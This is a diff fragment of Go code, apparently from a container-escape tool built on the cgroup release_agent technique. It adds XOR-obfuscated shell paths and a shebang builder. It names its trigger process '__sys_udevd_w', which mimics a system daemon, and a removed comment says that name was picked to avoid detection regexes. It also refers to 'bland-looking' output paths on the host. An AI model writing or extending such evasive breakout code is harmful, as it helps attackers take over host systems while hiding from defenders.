@@ -79,9 +79,24 @@ func CgroupReleaseAgentFile() string {
 	})
 }
 
+func ShellPath() string {
+	return xorObfsPath([]byte{
+		0x73, 0x3f, 0x37, 0x31, 0x77, 0x2a, 0x32,
+	})
+}
+
+func BashPath() string {
+	return xorObfsPath([]byte{
+		0x73, 0x3f, 0x37, 0x31, 0x77, 0x3b, 0x3b, 0x28, 0x3c,
+	})
+}
+
+func ShellShebang() string {
+	return "#!" + ShellPath() + "\n"
+}
+
 // TriggerArgv is the argv[0] marker used by the short-lived cgroup trigger
-// process (replaces `exec.Command("/bin/sh", "-c", "sleep 2")`).
-// It is intentionally innocuous and not matched by common exe regexes.
+// process. It avoids embedding a shell invocation in the argv vector.
 const TriggerArgv = "__sys_udevd_w"
 
 // RandomHostOutputFile returns a random, bland-looking absolute path under
